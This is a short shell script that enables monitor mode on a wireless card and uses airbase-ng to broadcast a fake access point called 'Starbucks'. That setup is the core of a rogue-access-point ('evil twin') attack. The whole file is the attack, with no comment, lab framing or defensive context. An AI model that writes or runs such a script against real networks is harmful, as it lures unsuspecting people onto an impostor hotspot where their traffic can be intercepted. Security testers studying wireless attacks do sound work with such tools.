#!/bin/sh

name="wlan0"

ifconfig $name up
airmon-ng start $name
airbase-ng -e "Starbucks" "$name"mon
